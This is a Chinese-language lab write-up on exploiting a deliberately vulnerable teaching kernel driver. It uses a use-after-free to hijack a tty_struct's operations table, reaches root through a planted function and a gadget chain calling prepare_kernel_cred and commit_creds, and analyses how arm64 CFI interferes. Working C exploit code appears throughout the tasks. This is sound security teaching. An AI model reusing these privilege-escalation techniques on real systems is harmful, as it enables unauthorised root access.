
## 前置知识

### 思考题 1
> **Question 1**：为什么会这样？为什么两次分配的内存块地址会一样？

堆的内存分配有不同的实现方式。<br />一种实现方式是简单地维护一个 free list，维护所有已经从 OS 申请的用作堆的内存块以及被 free 掉的内存块；因此当一块内存被 free 时，它会被加入 free list 中。当下次需要 malloc 时，allocator 会从 free list 找一块内存块分配给它。这时候又涉及到 Best-fit 还是 Next-fit 的问题，即 Best-fit 有助于提高空间利用率，而 Next-fit 有助于利用 cache 的 spatial locality；常见的做法是如果恰好相等就 Best-fit，否则就 Next-fit。但是在这种刚刚 free 就 malloc 一块等大的内存的情况中，Best-fit 和 Next-fit 会带来同样的结果，即将刚刚回收的内存块再分配出去；因此两次分配的内存块地址一样的概率就很大了。<br />另一种实现方式是维护一个 memory pool，实际上来说就是一个 free list 的数组，但是其中每一项对应着一个同等大小的内存块的 free list（如下图所示）；再次分配的方式类似。这种情况下，两次分配的内存块地址一样的概率也很大。<br />![](./assets/1649146593311-5d6c18b8-a6b5-43b1-8a59-2565a02b5011.png)

## 攻击思路
攻击的重点在于`/dev/ptmx`和`/dev/zjudev`。<br />由于内核中`zjudev`只有全局一个缓冲区，如果将设备打开两次，第二次打开的设备会覆盖第一次打开设备的缓冲区，且两次打开设备时候，我们可以获得指向同一个设备缓冲区的两个指针。<br />此时如果释放其中一个设备，由于在释放的时候指针没有置空，此时便可以通过另一个文件描述符操作该缓冲区对应的内存，即存在 UAF 漏洞。<br />同时实验提供的`ioctl`接口能够调整这个缓冲区大小。如果将其调整成内核中`tty_struct`的大小，完成上述操作后打开`/dev/ptmx`，内核会分配一个`tty_struct`结构体。当内核分配相同大小的数据结构时，便有可能使用这块由我们控制的缓冲区。<br />`zjudev`还为我们提供了`read`和`write`这块缓冲区的接口。由此我们便可以通过`write`来覆盖`/dev/ptmx`的 `const struct tty_operations *ops`字段，将其指向我们构建的一个形如`struct tty_operations`的结构体，这样在我们访问`/dev/ptmx`的某些接口的时候就会跳转到我们指定的函数中去，最终达到 root 权限的目的。

## Task 1
经过尝试和与助教沟通，我们发现`__randomize_layout`并没有发挥其作用。<br />在 [tty.h L143](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143) 中，我们可以看到`tty_struct`的定义（下图是部分内容）：
![image.png](./assets/1653829420926-8b6f53b0-0f87-4f22-b570-46c4fdac17c7.png)
我们关心的内容主要是`ops`：根据我们之前的讨论，我们的攻击方式就是更改这个字段。我们研究`ops`在`tty_struct`中的偏移；这里面唯一大小不明确的就是`kref`。我们追踪其定义：`struct kref` => `refcount_t` (`struct refcount_struct`) => `atomic_t` => `struct {int counter;}`，最终得知其大小就是一个`int`的大小，即 4 字节。因此，我们可以得出该结构体的基本排布：
![image.png](./assets/1653828539973-f9450cab-eb91-4d6e-9a43-0d151aa10be0.png)

### 思考题 2
> **Question 2**：如何确定自己所控制的指针一定被分配给`tty_struct`结构体？

可以看到，`tty_struct`结构体中的第一个字段是`magic`，在同一个文件中的第 215 行也可以看到，`TTY_MAGIC`的值被定义为`0x5401`：
![image.png](./assets/1653829175320-39f67f49-7c80-4b7f-a0a3-1431a03e15c2.png)
事实上，当分配`tty_struct`时，`magic`字段就会被置为`0x5401`，因此我们判断最开始的 4 个字节的值是否为`0x5401`，就能够知道我们控制的指针指向的缓冲区是否被分配给了`tty_struct`了。

结合上述已知内容，我们可以编写如下的代码来完成上述内容并且验证我们的想法：
```c
typedef unsigned long long u64;

#define TTY_STRUCT_SIZE 0x2B8
int doubleOpen();
int checkMagic(int dev);

int main() {
	int dev = doubleOpen();
	int ptmx = checkMagic(dev);
	
	return 0;
}

int doubleOpen() {
	int dev1 = open("/dev/zjudev", O_RDWR);
	int dev2 = open("/dev/zjudev", O_RDWR);
	
	ioctl(dev1, 0x0001, TTY_STRUCT_SIZE);
	close(dev1);
	
	return dev2;
}

int checkMagic(int dev2) {
	int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);
	
	char buf[TTY_STRUCT_SIZE] = {0};
	int readResult = read(dev2, buf, TTY_STRUCT_SIZE - 1);
	DEBUG(readResult, XYX_RED);
	
	for (int i = 0; i < TTY_STRUCT_SIZE; i += 8) {
		DEBUGI(*(u64 *)(buf + i), XYX_CYAN);
	}
	
	int magic;
	memcpy(&magic, buf, 4);
	DEBUG(magic, XYX_YELLOW);
	
	if (magic != 0x5401)	return checkMagic(dev2);
	else					return ptmx;
}
```
在上面的代码中，`doubleOpen()`函数打开两个`zjudev`，将其缓冲区大小调整为`tty_struct`的大小后关闭其中之一，返回另一个的文件描述符；`checkMagic(dev)`尝试打开`/dev/ptmx`并检查`magic`的位置是否是`0x5401`，也就检查了缓冲区是否被分配给了`tty_struct`。如果是的话，返回`ptmx`的文件描述符；否则反复运行`checkMagic(dev)`直到上述条件为真为止。

可以看到，调试信息中验证了`magic`的值是`0x5401`：
![image.png](./assets/1653830459817-8564000a-37dc-450b-8cc7-a171f9adee69.png)
![image.png](./assets/1653831319396-fc1620d5-ba55-40f7-b19e-ead40217d398.png)


## Task 2
Task 2 要求我们利用`hack_cred`函数获取 root 权限。<br />在 [tty_driver.h L247](https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty_driver.h#L247) 中查看，发现`struct tty_operations`由 36 个函数指针构成。我们查看 Task 1 中取到的`buf + 24`位置上的`ops`指针指向的内容：
![image.png](./assets/1653831940224-e712cfe1-8319-455c-9dad-05a0a39e0a7e.png)
其中第一个指针指向的是`lookup`函数指针，我们去看一下到底指的是哪个函数：
![image.png](./assets/1653832531098-d053ccd1-e558-49af-8f8e-804b655fcf62.png)
知道了这个函数的名字之后，我们去看一下它在 System.map 中的地址：
![image.png](./assets/1653832582914-ceabcb71-8ff7-4058-909f-5e093c66b4fa.png)
可以看到，在调试状态下好像并没有开 KASLR 。但是，如果需要绕过 KASLR，我们只需要对 Task1 中得到的`ops`做一次取值，就能得到`ptm_unix98_lookup`的地址，与`0xffff80001076c978`计算一下偏移就可以了。

进一步地，如我们之前分析的那样，我们想要构造一个自己的`struct tty_operations`，篡改之前的`ops`使其指向这个结构体，然后调用`ptmx`的某个接口从而实现调用`hack_cred`。我们不妨将 36 个全都改成`hack_cred`的地址！<br />从 System.map 中，我们可以找到`hack_cred()`的地址`0xffff80001083aa84`：
![image.png](./assets/1653830088065-7b9c6267-cc13-4411-bfb7-39df51c8282f.png)

（刚开始我们只给`write`一个函数赋值，别的都是 0，因为当时看`write`的参数签名和`hack_cred`的能兼容，但是出现了下面的提示。应该是操作系统会检查是否存在空的函数指针。）<br />![_8RJTNRID4VYJJT6YEF0{PJ.png](./assets/1653836727333-59879d69-f3ef-489d-9591-ef41c5d6e4a9.png)

最终，我们编写了如下代码，可以成功获得 root 权限！（`getOffset()`会段错误，所以暂时没有用）
```c
// ==== Task 2 ====
const u64 lookupAddr = 0xffff80001076c978;
const u64 hackCredAddr = 0xffff80001083aa84;
u64 offset = 0;
#define target(x) (x + offset)
u64 forgedOps[36];

void getOffset();
void forgeOps(int dev);

int main() {
	// Task 1:
	int dev = doubleOpen();
	int ptmx = checkMagic(dev);
	
	// Task 2:
	//getOffset();
	forgeOps(dev);
	close(ptmx);
	system("/bin/sh");
	
	return 0;
}

void getOffset() {
	u64 *ops = (void *)(*(u64 *)(buf + 24));
	DEBUG(ops, XYX_GREEN);
	
	u64 realLookupAddr = *ops;
	offset = realLookupAddr - lookupAddr;
	DEBUG(realLookupAddr, XYX_GREEN);
	DEBUG(offset, XYX_GREEN);
}

void forgeOps(int dev) {
	for (int i = 0; i < 36; i++)
		forgedOps[i] = target(hackCredAddr);
	
	char newBuf[32];
	u64 forgedOpsPtr = (u64)(&forgedOps);
	memcpy(newBuf, buf, 24);
	memcpy(newBuf + 24, &forgedOpsPtr, 8);
	
	for (int i = 0; i < 32; i += 8) {
		DEBUGI(*(u64 *)(newBuf + i), XYX_PURPLE);
	}
	
	write(dev, newBuf, 32);
}

```
![image.png](./assets/1653836823332-4ebe8109-28c0-463c-974b-f753b52b080a.png)
可以看到，上面圈圈 1 的位置打开的`ptmx`的`tty_struct`并不在我们控制的 buffer 那里，因此我们开了第二次。然后我们伪造了一个`ops`，调用`close(ptmx)`，这样就会调用到我们的`hack_cred`了！

### 思考题 3
> **Question 3**: 为什么不能直接通过 UAF 控制 cred 结构体直接修改其内容？

在 [kernel pwn -- UAF](https://blog.actorsfit.com/a?ID=01300-7b56e285-dfe9-4854-98a1-cb70a01ae043) 中，我们可以找到一个非常类似的通过 UAF 控制 cred 实现提权的例子。其代码大致如下：
```c
typedef unsigned long long u64;

int main() {
	u64 cred[100] = {0, 0, 0}; 

    int dev1 = open("/dev/zjudev", O_RDWR);
    int dev = open("/dev/zjudev", O_RDWR);

    DEBUG(0xA8, XYX_PURPLE);
    ioctl(dev1, 0x0001, 0xA8);
    close(dev1);

    int id = fork();
    write(dev, cred, 28);
    if(id == 0){
        DEBUG(getuid(), XYX_CYAN);
        if (!getuid()) {
            printf("[*]welcome root:\n");
            system("/bin/sh");
        }
        return 0;
    }
    else if(id < 0){
        printf("[*]fork fail\n");
    }
    else{
        DEBUG(getuid(), XYX_GREEN);
        wait(NULL);
        DEBUG(getuid(), XYX_BLUE);
    }

	return 0;
}
```
但是，我运行了这段代码后始终没有获得成功。关注到参考的题目中使用的 linux 版本是 4.4.72，我查看了相关的 kernel 代码，尤其关注了两者的不同。

在 [cred.c L718](https://elixir.bootlin.com/linux/v5.15/source/kernel/cred.c#L718) 查看`prepare_kernel_cred`的源码：
![image.png](./assets/1653843779066-bb7a6c1f-3264-43c5-8e05-7e456e9d9bc7.png)
这里调用了 [slab.c L3505](https://elixir.bootlin.com/linux/v5.15/source/mm/slab.c#L3505) 的`kmem_cache_alloc`，其中调用了`slab_alloc`分配内存，因此理论上有与前述攻击类似的可能。

`validate_creds`作为一个在很多地方被调用的内容，引起了我的注意：
![image.png](./assets/1653848145847-c081f7b1-8529-480f-8eb9-c00b111765c7.png)
![image.png](./assets/1653848190252-264b0460-ab51-40bd-bc7a-f1deca7b31d3.png)
![image.png](./assets/1653848225415-a3da77f8-01b6-4d45-9874-4923d173f40b.png)
![image.png](./assets/1653843503447-399205b9-5ca3-438a-8284-26875151c1fe.png)
可以看到，它通过检查`cred->magic`是否等于`CRED_MAGIC`来判断`cred`是否合法，如果不合法会将这个`cred`抛弃掉。因此我尝试将`magic`对应置位：
![image.png](./assets/1653848485237-d37d88fc-9b25-4aac-8e4c-11247c37b32d.png)
但是仍未得到对应结果。<br />我也试图通过调试来发现问题，但是这些检查的函数多以宏或者 inline 的方式呈现，并不能够用来调试：
![image.png](./assets/1653846398667-3192e9c6-f06e-4ecb-89ac-e28948e0017e.png)
我还尝试了调整缓冲区大小、反复尝试等方案，但是都未能产生预期结果。对比两个版本的代码，仍未发现比较关键的因素。

对比两个版本的代码，我认为可能性比较大的原因是`cred`结构体在 v5.15 启用了 v4.4.70 尚未使用的`__randomize_layout`，并且在更多的地方检查了`cred`的`magic`。因而我们更加难以将`magic`置位，同时也会在更多的地方被检查和报告出来。

与同学交流之后，同学提醒我`prepare_kernel_cred`使用了`cred_jar`：
![image.png](./assets/1653843779066-bb7a6c1f-3264-43c5-8e05-7e456e9d9bc7.png)
我们查看`cred_jar`的使用，找到了在`put_cred_rcu`中时候会调用`kmem_cache_free(cred_jar, cred)`。这个函数会在`__put_cred`，即销毁`cred`的时候被调用。
![image.png](./assets/1653923657374-5121b404-727b-49af-aba0-66c1762e42c7.png)
查看`kmem_cache_free`的源码，发现其中调用了`__cache_free`函数：
![image.png](./assets/1653923877314-9e115a16-f216-4e2f-a6ad-47de90867005.png)
查看这个函数的源码，从注释中可以看到，这里将对象 release 的时候，会将其加到这个对象的 cache 中。对于我们的例子来说，在释放`cred`的时候，会将释放的结果放在`cred_jar`中：
![image.png](./assets/1653923548309-a2892908-86a7-4bd2-8b8b-482d8bf102fd.png)
因此，事实上在为进程分配`cred`的时候会从`cred_jar`中找空间分给`cred`：
![image.png](./assets/1653843779066-bb7a6c1f-3264-43c5-8e05-7e456e9d9bc7.png)
![image.png](./assets/1653964751005-6e053d29-6879-4dd8-b82c-b97c517ef223.png)
我并没有找到当`cachep`耗尽时会采取的操作；但我编写了如下的代码尝试不断`fork()`而不释放，尝试能否获取 root 权限：
```c
int main() {
	u64 cred[100] = {0, 0, 0}; 
	int timess = 0;
	
	while (1) {
		int dev1 = open("/dev/zjudev", O_RDWR);
		int dev = open("/dev/zjudev", O_RDWR);
				
		timess++;
		
		int offs = (timess % 9) * 4;
		ioctl(dev1, 0x0001, 0xA0 + offs);
		close(dev1);
		
		cred[2] = (timess % 5) ? 0 : 0x43736564;
		
		int id = fork();
		int o = timess % 7 < 3 ? 0 : (timess % 7) * 4;
		write(dev, cred, 28 + o);
		if (id == 0) {
			DEBUG(getuid(), XYX_CYAN);
			DEBUG(getpid(), XYX_CYAN);
			if (!getuid()) {
				printf("[*]welcome root:\n");
				system("/bin/sh");
			} 
		} else {
			DEBUG(getpid(), XYX_GREEN);
			wait(id);
			DEBUG(getpid(), XYX_RED);
		}
	}
	
	return 0;
}
```
这里的`timess`是为了组合之前提到的不同考虑因素设置的。可以看到，这个程序除了成功获取 root 外，都会不断地 fork 并尝试覆写`cred`。但是程序运行到 out of memory 直至 kernel panic 也没有成功：![image.png](./assets/1653965903885-6e41bb2c-ce80-417c-8430-3079ad88aa57.png)
（可以看到，这时 fork 出的进程数已经达到了 0xa00 以上的数目）<br />因此我们猜测，当 cache 耗尽时，可能也不会直接取用空闲空间，而是由 cache 申请一块较大的空间。我们暂时无法得知这块空间的大小，因此我们很难做对应的操作。

总结和概括来说，`cred`结构体分配并不是直接从空闲空间中分配，而是从一个专门的 cache `cred_jar`中分配。这样自然就不会分配到我们所控制的内存块了。

## Task 3
获取这些东西的地址：
![image.png](./assets/1653848847569-67e3d636-f600-4bd7-8c50-e08139e35cc6.png)

   - `0xffff80001083aa44` `zju_gadget1`
   - `0xffff80001083aa5c` `zju_gadget2`
   - `0xffff80001083aa74` `zju_gadget3`
   - `0xffff8000100b6030` `prepare_kernel_cred`
   - `0xffff8000100b5bac` `commit_creds`

我们最终想达到的目的就是调用`struct cred* root_cred = prepare_kernel_cred(NULL);`和`commit_creds(root_cred);`<br />我们写出这三个 gadget 的伪代码：
```c
gadget1 {
    x1 = *(x0 + 0x38);	// x0 + 7
    x0 = x2;
    goto x1;
}

gadget2 {
    x0 = 0;
    x1 = *(x2 + 0x28);	// x2 + 5
    goto x1;
}

gadget3 {
    return x0;
}
```

根据实验指导的 4.3.2 利用 ioctl 控制寄存器 一节，我们可以知道，当我们调用`ioctl(fd, p1, p2)`这个系统调用的时候，实际上会完成如下内容：
```c
int ioctl(int fd, unsigned long int p1, void *p2) {
    ioctl_operation(tty_struct_of_fd, p1, p2);
    // which will make x0 = tty_struct_of_fd, x1 = p1, x2 = p2
}
```

综合上述内容，结合实验指导的提示，我们梳理出如下的调用过程：

- 获取`tty_struct`的地址
   - 调用`ioctl(fd, _, _)`，这会使得`x0 = tty_struct_of_fd`；我们将`ops`中`ioctl`的函数指针改为 gadget3 的地址，这样它会直接返回，返回值即为`x0`，即`tty_struct_of_fd`。
- 调用`prepare_kernel_cred(NULL);`并记录返回值
   - 调用这个需要让`x0 = 0`，因此我们注意到 gadget2。它将`x0`置为 0，然后将`x1`置为`*(x2 + 0x28)`。因此我们可以让`x1 = prepare_kernel_cred`，这样就可以完成调用了。
   - 所以，我们需要让`x2`指向`ops`的某个位置，`+ 0x28`就会找到它之后 5 位的函数指针，我们将这个指针控制为`prepare_kernel_cred`即可。
   - 同时，我们还需要记录返回值。因此，我们再调用一次`ioctl(fd, _, p2)`。我们不妨将`ioctl`指针改为 gadget2 的地址；让`p2`就等于`ops`，这样我们将`ops[5]`设为`prepare_kernel_cred`的地址，就可以实现调用和记录返回值了。
- 调用`commit_creds(root_cred);`
   - 调用这个需要让`x0 = root_cred`，但是`ioctl`不能直接填`x0`。注意到 gadget1 可以让`x0 = x2`，因此可以使用它。
   - 类似之前的思路，我们将`ioctl`指针改为 gadget1 的地址，让`p2`等于前一步的返回值；调用`ioctl`会使得`x0 = tty_struct_of_fd`，而`x1`会被赋值为`*(x0 + 0x38)`，因此将`buf[7]`设为`commit_creds`的地址然后`write`回去即可。当然，`buf[7]`也可以在之前的`write`中被一并设置，我们的实现中就采用了这种方法。

按照上述思路构建攻击代码后，发现并不能产生预期结果。查看调试信息发现，获取到的地址高位均为 0。分析得知，`ioctl`的返回值类型是 `int`，因此对于返回的地址信息，我们还需要将其对`0xffff000000000000`做按位或运算。
![image.png](./assets/1653895154442-66483aa2-c4da-4413-8fd2-15a40ee9c65e.png)

对应进行修改后，我们写出了这样的代码：
```c
// ==== Task 3 ====
const u64 gadget1Addr = 0xffff80001083aa44;
const u64 gadget2Addr = 0xffff80001083aa5c;
const u64 gadget3Addr = 0xffff80001083aa74;
const u64 pkcAddr = 0xffff8000100b6030;
const u64 ccAddr = 0xffff8000100b5bac;

void prepareTtyStruct(int dev);

int main() {
	DEBUG(buf, XYX_RED);
	// Task 1:
	int dev = doubleOpen();
	int ptmx = checkMagic(dev);
	
	// Task 3:
	prepareTtyStruct(dev);
	
	// > Step 1:
	forgedOps[12] = gadget3Addr;
	u64 ttyAddr = ioctl(ptmx, 0, 0) | 0xffff000000000000;
	DEBUG(ttyAddr, XYX_RED);
	
	// > Step 2:
	forgedOps[12] = gadget2Addr;
	forgedOps[5] = pkcAddr;
	u64 credRetVal = ioctl(ptmx, 0, forgedOps) | 0xffff000000000000;
	DEBUG(credRetVal, XYX_CYAN);
	
	// > Step 3: (buf[7] has been set in prepareForgeOps())
	forgedOps[12] = gadget1Addr;
	ioctl(ptmx, 0, credRetVal);
	
	system("/bin/sh");
	
	return 0;
}

void prepareTtyStruct(int dev) {
	memset(forgedOps, -1, sizeof forgedOps);
	
	char newBuf[0x40];
	u64 forgedOpsPtr = (u64)(&forgedOps);
	memcpy(newBuf, buf, 0x40);
	memcpy(newBuf + 24, &forgedOpsPtr, 8);
	memcpy(newBuf + 0x38, &ccAddr, 8);
	
	for (int i = 0; i < 0x40; i += 8) {
		DEBUGI(*(u64 *)(newBuf + i), XYX_PURPLE);
	}
	
	write(dev, newBuf, 0x40);
}
```

尝试编译运行，得到了正确的结果，获得了 root 权限！
![image.png](./assets/1653896028902-b86c4022-ebe2-4054-80d7-81c9254fa3a8.png)


### 思考题 4
> **Question 4**：为什么第二步可以直接`ret`获取到`tty_struct`结构体的地址？`ret`执行前后的控制流是什么样的？

如之前所说，用户程序调用`ioctl`这个 system call 时，`ioctl`会将`tty_struct`的地址作为第一个参数传给对应设备的`ioctl`函数（即保存在`struct tty_operations`中的对应函数指针），而第一个参数会保存在寄存器`x0`中。运行到`ret`时返回，`ioctl`函数从`x0`中接受返回值，并将其返回给调用者；这个过程中`x0`的值始终是`tty_struct`的地址。
![image.png](./assets/1653899369701-32ce65cf-4bad-44a6-b641-d4744fef3481.png)
使用 gdb 调试可以看到，调用`ioctl`之后，经过一系列的系统调用处理过程来到了`zju_gadget3`，这时`x0`的值就是`tty_struct`的地址。`zju_gadget3`返回之后这个值被传回调用`ioctl`的位置，继续运行。


## Task 4
我们尝试查看思考题 4 中遇到的`tty_ioctl`的汇编，但是它太长了！于是我们在`tty_io.c`里找一找没那么长的，找到了这个函数：<br />![EOOJPX5KVOI$OC5S107C])X.png](./assets/1653966932022-9a6d77a3-0948-4275-9851-a40db6edc487.png)
看起来很不错！

用 objdump 看看它们的代码：
![image.png](./assets/1653966892358-c6a6c54e-69f3-46cc-9e07-9216a0c795cc.png)
![image.png](./assets/1653966881661-86919e40-7ffc-4e05-8b4b-87b39651c002.png)
nocfi 的代码是比较好看懂的。下面是代码和含义的注释：
![image.png](./assets/1653967626361-ca9511ad-7d1b-4e47-885d-57a526b9367a.png)
支持 cfi 的汇编代码就稍微有些复杂了：
![image.png](./assets/1653971377846-8268b2a9-10f4-42d9-b21d-474f7ec30e1e.png)
可以看到，如果`x8`即跳转的目标到`x9`(0xffff800009813b40) 的差值过大，那么就会跳转到 cfi error handler 那里，调用`__cfi_slowpath_diag`报告问题，然后跳回`blr x8`语句继续运行。也就是说，这里只会检查和报告 cfi 错误，但是仍然允许继续运行。这一点从源码这里也可以看出：
![image.png](./assets/1653970479520-9b4b8136-8ed8-4a14-9b31-05375829e63d.png)
即，当 enable 了`CONFIG_CFI_PERMISSIVE`时，只报告错误而不 panic。

具体而言，我们根据资料了解到 ARM 中 CFI 的实现机制。对于那些可能会被间接调用的函数，编译时自动生成一个名为`fun_name.cfi_jt`的函数，其中`fun_name`就是这个函数的名字。我们在 dump 出的文件中可以找到大量的这样的函数：
![image.png](./assets/1653970900714-31bcd301-2157-4da4-babd-cdf02b7b5458.png)
这些函数的排列方式是，具有相同函数签名的函数放在一起。这样就起到了一个分组的作用。

挑选一个幸运函数进行查看，发现其实这不是“函数”，只是调用了一个`bti c`然后跳转到对应的函数的代码块：![image.png](./assets/1653971191686-022ae288-9662-4ef5-8ccb-d7de86fc68be.png)
查阅资料得知，`bti`指令的全名是 Branch Target Identification，is used to guard against the execution of instructions which are not the intended target of a branch。<br />也就是说，对于间接调用来说，我们通过`.cfi_jt`的形式限定了间接调用的目标只能是这些函数；而具有相同函数签名的函数又保存在相邻的位置，这进一步限定了目标函数的范围。因此在任何一次间接调用之前，我们判断间接调用的目标是否在其定义时函数指针的类型所对应的集合的地址范围之内，就可以一定程度上判别这种调用是否合法了。如果不合法，采用相应方式进行解决。

查看 0xffff800009813b40 附近的函数：
![image.png](./assets/1653971571377-ad6e46ce-8267-4389-b4f0-e79178796051.png)
![image.png](./assets/1653972226008-681bf3fb-0a9e-4830-a6ae-e9b142d0d140.png)
即，这些函数就是和我们调用的函数指针本身的签名相同的函数的`.cfi_jt`，代码限定了只能跳转到这个范围运行，否则就会触发 cfi failure。

运行攻击代码，在没有 cfi 的 image 上运行正常：
![image.png](./assets/1653969148343-24d21cff-160a-4f28-8955-b0a3e9c98c4a.png)
在有 cfi 的 image 上运行时，可以看到在尝试访问`0xffff80001083aa84` 这个地址时出现了错误：
![image.png](./assets/1653968959479-80cdc040-a304-4c19-a2f8-24cc52ef5561.png)
查看 dmesg，看到相关信息：
![image.png](./assets/1653968915042-0c8d98e9-309b-4a20-8336-3c70e129567f.png)

> 但是，根据我们之前的分析，cfi 只会报告 cfi failure，但是会继续执行。那么为什么我们在有 cfi 的 image 上运行仍然会出现错误呢？也就是说，这个段错误发生在 cfi error handler 中：
> ![image.png](./assets/1653970414750-b50a4600-7c6d-4136-bc9b-d453a743f373.png)
> 这里调用了`__cfi_slowpath_diag`，x0, x1, x2 是传入的三个参数。这个函数内部也使用到了一些函数指针的访问，因此不是很能看懂。但是回忆我们的攻击过程中，我们将除了利用到以外的`ops`中的指针全部置成了全 1，因此这里如果访问对应地址也会发生段错误。

